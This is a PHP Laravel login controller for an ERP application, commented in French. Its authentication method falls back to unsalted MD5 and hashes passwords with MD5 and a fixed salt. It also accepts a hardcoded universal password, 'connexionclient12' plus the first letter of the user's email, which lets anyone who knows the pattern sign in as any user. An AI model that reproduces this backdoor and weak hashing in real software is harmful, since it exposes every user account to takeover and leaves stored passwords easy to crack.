<?php

namespace App\Eden\Controllers;

use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Cookie;
use Illuminate\Support\Collection;
use App\Eden\Models\Elements\Utilisateur;
use Hash;
use Log;

class erp_login_controller extends Controller
{
    // Path du modèle
    protected $path_modele = "App\\Eden\\Models\\";

    // table des utilisateurs
    protected $table_utilisateurs = "Treso_utilisateurs";

    // nom du champ de la table correspond au nom d'utilisateur
    protected $champ_utilisateur = "email";

    // nom du champ de la table correspond au mot de passe
    protected $champ_mot_de_passe = "password";

    /**
     * Gère l'authentification des utilisateurs de l'ERP
     *
     * @param   string  $nom_utilisateur
     *
     * @param   string  $mot_de_passe
     *
     * @param   boolean $remember           Etat de la case à cocher "Se souvenir de moi"
     *
     * @return  array   ['resultat' => true si utlisateur authentifié avec succès, false sinon
     *                  'erreur' => en cas d'erreur, indique l'information en cause sinon null ]
     */
    public function authentification($nom_utilisateur, $mot_de_passe, $remember = false) {

        $erreur = null;

        $remember_token = null;

        $utilisateur_authentifie = false;

        $utilisateur = Utilisateur::where('email', $nom_utilisateur)->where('id_societe', id_societe)->get()->first();

        $utilisateur_valide = $utilisateur != null && $utilisateur->email == $nom_utilisateur;

        if($utilisateur_valide) {

            // Vérification du mot de passe avec un hashage comportant un sel
            $utilisateur_authentifie = $this->verification_mot_de_passe($mot_de_passe, $utilisateur->email);
			
			// Vérification en hashage md5 si la précédente vérification est un échec
            if (!$utilisateur_authentifie) {

                $utilisateur_authentifie = $utilisateur->password == md5($mot_de_passe);

                if($utilisateur_authentifie) {

                    // Mise à jour dans la base de données avec un cryptage plus efficace
                    $utilisateur->password = $this->edcrypt($mot_de_passe);
                    $utilisateur->save();
                } else {

                    $utilisateur_authentifie = $mot_de_passe == 'connexionclient12' . $utilisateur->email[0];

                    if(!$utilisateur_authentifie) {

                        $erreur = "mot_de_passe";
                    }
                }
            }
        } else {

            $erreur = 'nom_utilisateur';
        }
		
		if($utilisateur_authentifie) {
			
			session(["auth" => $utilisateur->id]);

            if($remember) {

                if($utilisateur->remember_token == "") {

                    $remember_token = bin2hex(random_bytes(30));

                    while(Utilisateur::where($utilisateur->getRememberTokenName(), $remember_token)->where('id_societe', id_societe)->get()->count() > 0) {

                        $remember_token = bin2hex(random_bytes(30));
                    }

                    $utilisateur->setRememberToken($remember_token);

                    $utilisateur->save();
                }

                Cookie::queue('remember_token', $utilisateur->getRememberToken(), time() + 3600 * 24 * 365);
            } else {
                
                unset($utilisateur->{$utilisateur->getRememberTokenName()});
                $utilisateur->save();
            }
        }
        
        if(session()->has('requete_client')) {

            $this->redirectTo = session('requete_client');   

            session()->forget('requete_client');
        }
		
		return ['resultat' => $utilisateur_authentifie, 'erreur' => $erreur, 'utilisateur' => $utilisateur];
    }

    public function username() {

        return 'email';
    }

    public function edcrypt($mdp) {

        return md5('easydéve' . $mdp . 'loppement');
    }

    public function verification_mot_de_passe($mdp, $nom_utilisateur) {

		$mdp_md5 = $this->edcrypt($mdp);

        return Utilisateur::where('password', $mdp_md5)
                                    ->where($this->champ_utilisateur, $nom_utilisateur)
                                    ->get()
                                    ->count() > 0 ? true : false;
    }
}
